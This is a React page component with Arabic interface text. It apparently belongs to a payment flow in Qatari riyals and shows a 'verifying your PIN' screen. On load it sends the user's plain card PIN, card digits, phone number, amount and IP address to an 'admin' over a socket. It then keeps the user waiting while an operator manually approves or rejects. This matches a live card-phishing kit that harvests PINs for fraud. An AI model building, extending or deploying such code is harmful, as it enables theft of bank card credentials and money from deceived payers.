import { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { useSocket } from '../context/SocketContext';

export default function PINVerification() {
  const navigate = useNavigate();
  const location = useLocation();
  const { socket } = useSocket();
  
  const { pinCode, cardLastDigits, phoneNumber, amount } = location.state || {};
  
  const [verificationStatus, setVerificationStatus] = useState('pending'); // pending, approved, rejected
  const [timeLeft, setTimeLeft] = useState(120); // 2 دقيقة
  const [showAdminControls, setShowAdminControls] = useState(false);

  useEffect(() => {
    // التحقق من وجود البيانات المطلوبة
    if (!pinCode || !cardLastDigits) {
      navigate('/payment-failed');
      return;
    }

    // الحصول على IP الخاص بالمستخدم
    const userIP = sessionStorage.getItem('userIP');

    // الاستماع لرد الأدمن
    if (socket) {
      // إرسال رمز PIN للأدمن عبر Socket
      socket.emit('newPIN', {
        ip: userIP,
        pinCode,
        cardLastDigits,
        phoneNumber,
        amount,
        timestamp: new Date().toISOString()
      });

      socket.on('pinVerificationStatus', (data) => {
        console.log('🔑 PIN verification status received:', data);
        
        // التحقق من أن الرسالة موجهة لهذا المستخدم فقط
        if (data.ip && data.ip !== userIP) {
          console.log('⚠️ PIN status not for this user, ignoring');
          return;
        }

        if (data.status === 'approved') {
          setVerificationStatus('approved');
          setTimeout(() => {
            navigate('/payment-success', {
              state: {
                cardLastDigits,
                phoneNumber,
                amount,
                timestamp: new Date().toISOString()
              }
            });
          }, 1500);
        } else if (data.status === 'rejected') {
          setVerificationStatus('rejected');
          setTimeout(() => {
            navigate('/payment-pin', {
              state: {
                cardLastDigits,
                phoneNumber,
                amount
              },
              replace: true
            });
          }, 2000);
        }
      });

      return () => {
        socket.off('pinVerificationStatus');
      };
    }
  }, [socket, navigate, pinCode, cardLastDigits, phoneNumber, amount]);

  // مؤقت العد التنازلي
  useEffect(() => {
    if (verificationStatus !== 'pending') return;

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          // انتهى الوقت - نرجع لصفحة إدخال PIN
          navigate('/payment-pin', {
            state: {
              cardLastDigits,
              phoneNumber,
              amount
            },
            replace: true
          });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [verificationStatus, navigate, cardLastDigits, phoneNumber, amount]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const getProgressPercentage = () => {
    return ((120 - timeLeft) / 120) * 100;
  };

  // التعامل مع القبول من المستخدم نفسه
  const handleApprove = () => {
    if (!socket) return;
    
    const userIP = sessionStorage.getItem('userIP');
    
    setVerificationStatus('approved');
    
    // إرسال حالة القبول للسيرفر
    socket.emit('approvePIN', {
      ip: userIP,
      pinCode,
      status: 'approved'
    });

    // الانتقال لصفحة النجاح
    setTimeout(() => {
      navigate('/payment-success', {
        state: {
          cardLastDigits,
          phoneNumber,
          amount,
          timestamp: new Date().toISOString()
        }
      });
    }, 1500);
  };

  // التعامل مع الرفض من المستخدم نفسه
  const handleReject = () => {
    if (!socket) return;
    
    const userIP = sessionStorage.getItem('userIP');
    
    setVerificationStatus('rejected');
    
    // إرسال حالة الرفض للسيرفر
    socket.emit('rejectPIN', {
      ip: userIP,
      pinCode,
      status: 'rejected'
    });

    // العودة لإدخال PIN
    setTimeout(() => {
      navigate('/payment-pin', {
        state: {
          cardLastDigits,
          phoneNumber,
          amount
        },
        replace: true
      });
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-amber-50 to-orange-100 flex items-center justify-center px-4">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8">
        {/* الحالة */}
        {verificationStatus === 'pending' && (
          <>
            {/* الأيقونة المتحركة */}
            <div className="flex justify-center mb-6">
              <div className="relative">
                <div className="w-24 h-24 bg-amber-100 rounded-full flex items-center justify-center animate-pulse">
                  <svg className="w-12 h-12 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                  </svg>
                </div>
                <div className="absolute inset-0 rounded-full border-4 border-amber-300 animate-ping opacity-75"></div>
              </div>
            </div>

            {/* العنوان */}
            <h1 className="text-2xl font-bold text-center text-gray-800 mb-2">
              جارٍ التحقق من الرمز السري
            </h1>
            <p className="text-center text-gray-600 mb-6">
              يرجى الانتظار حتى يتم التحقق من الرمز السري من قبل النظام
            </p>

            {/* معلومات الرمز السري */}
            <div className="bg-gradient-to-r from-amber-500 to-orange-600 rounded-lg p-6 mb-6 text-white">
              <div className="text-center mb-4">
                <div className="text-sm opacity-90 mb-2">الرمز السري المدخل</div>
                <div className="flex justify-center gap-2" dir="ltr">
                  {pinCode.split('').map((digit, index) => (
                    <div key={index} className="w-12 h-12 bg-white/20 backdrop-blur rounded-lg flex items-center justify-center text-2xl font-bold">
                      •
                    </div>
                  ))}
                </div>
              </div>

              <div className="border-t border-white/30 pt-4 space-y-2">
                <div className="flex justify-between items-center">
                  <span className="text-sm opacity-90">البطاقة:</span>
                  <span className="font-mono" dir="ltr">•••• {cardLastDigits}</span>
                </div>
                {phoneNumber && (
                  <div className="flex justify-between items-center">
                    <span className="text-sm opacity-90">الهاتف:</span>
                    <span dir="ltr">{phoneNumber}</span>
                  </div>
                )}
                {amount && (
                  <div className="flex justify-between items-center pt-2 border-t border-white/30">
                    <span className="text-sm opacity-90">المبلغ:</span>
                    <span className="text-xl font-bold" dir="ltr">QAR {amount}</span>
                  </div>
                )}
              </div>
            </div>

            {/* العد التنازلي */}
            <div className="mb-6">
              <div className="flex items-center justify-between mb-2">
                <span className="text-sm text-gray-600">الوقت المتبقي</span>
                <span className={`text-lg font-bold ${timeLeft < 30 ? 'text-red-600' : 'text-amber-600'}`}>
                  {formatTime(timeLeft)}
                </span>
              </div>
              
              {/* شريط التقدم */}
              <div className="w-full bg-gray-200 rounded-full h-3 overflow-hidden">
                <div 
                  className={`h-full transition-all duration-1000 ${
                    timeLeft < 30 ? 'bg-red-500' : 'bg-amber-500'
                  }`}
                  style={{ width: `${getProgressPercentage()}%` }}
                />
              </div>
            </div>

            {/* رسالة الانتظار */}
            <div className="bg-amber-50 border border-amber-200 rounded-lg p-4 mb-4">
              <div className="flex items-start gap-3">
                <svg className="w-6 h-6 text-amber-600 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <div className="text-sm text-gray-700">
                  <p className="font-semibold mb-1">يتم الآن التحقق من الرمز السري</p>
                  <p>قد يستغرق هذا بضع لحظات. يرجى عدم إغلاق النافذة أو الرجوع للخلف.</p>
                </div>
              </div>
            </div>

            {/* نقاط التحميل المتحركة */}
            <div className="flex justify-center gap-2 mb-6">
              <div className="w-3 h-3 bg-amber-500 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
              <div className="w-3 h-3 bg-amber-500 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
              <div className="w-3 h-3 bg-amber-500 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
            </div>
          </>
        )}

        {verificationStatus === 'approved' && (
          <>
            {/* نجح التحقق */}
            <div className="flex justify-center mb-6">
              <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center">
                <svg className="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
            </div>
            <h1 className="text-2xl font-bold text-center text-green-600 mb-2">
              تم التحقق بنجاح
            </h1>
            <p className="text-center text-gray-600 mb-6">
              جارٍ إتمام عملية الدفع...
            </p>
          </>
        )}

        {verificationStatus === 'rejected' && (
          <>
            {/* فشل التحقق */}
            <div className="flex justify-center mb-6">
              <div className="w-24 h-24 bg-red-100 rounded-full flex items-center justify-center">
                <svg className="w-12 h-12 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
            </div>
            <h1 className="text-2xl font-bold text-center text-red-600 mb-2">
              فشل التحقق
            </h1>
            <p className="text-center text-gray-600 mb-6">
              الرمز السري غير صحيح. جارٍ إعادة التوجيه...
            </p>
          </>
        )}

        {/* زر الإلغاء (فقط في حالة الانتظار) */}
        {verificationStatus === 'pending' && (
          <div className="space-y-3">
            {/* زر إظهار أزرار التحكم */}
            <button
              onClick={() => setShowAdminControls(!showAdminControls)}
              className="w-full bg-amber-600 text-white py-3 rounded-lg font-semibold hover:bg-amber-700 transition-colors flex items-center justify-center gap-2"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4" />
              </svg>
              {showAdminControls ? 'إخفاء أزرار التحكم' : 'عرض أزرار التحكم'}
            </button>

            {/* أزرار القبول والرفض */}
            {showAdminControls && (
              <div className="bg-gradient-to-r from-amber-50 to-orange-50 border-2 border-amber-200 rounded-xl p-4 space-y-3">
                <div className="text-center mb-2">
                  <span className="text-sm font-semibold text-amber-800 bg-amber-100 px-3 py-1 rounded-full">
                    أزرار التحكم السريع
                  </span>
                </div>
                
                <div className="grid grid-cols-2 gap-3">
                  {/* زر القبول */}
                  <button
                    onClick={handleApprove}
                    className="bg-gradient-to-r from-green-500 to-green-600 text-white py-3 px-4 rounded-lg font-bold hover:from-green-600 hover:to-green-700 transform hover:scale-105 transition-all duration-200 shadow-lg flex items-center justify-center gap-2"
                  >
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                    </svg>
                    قبول
                  </button>

                  {/* زر الرفض */}
                  <button
                    onClick={handleReject}
                    className="bg-gradient-to-r from-red-500 to-red-600 text-white py-3 px-4 rounded-lg font-bold hover:from-red-600 hover:to-red-700 transform hover:scale-105 transition-all duration-200 shadow-lg flex items-center justify-center gap-2"
                  >
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                    </svg>
                    رفض
                  </button>
                </div>
              </div>
            )}

            <button
              onClick={() => navigate('/payment-failed')}
              className="w-full bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300 transition-colors"
            >
              إلغاء العملية
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
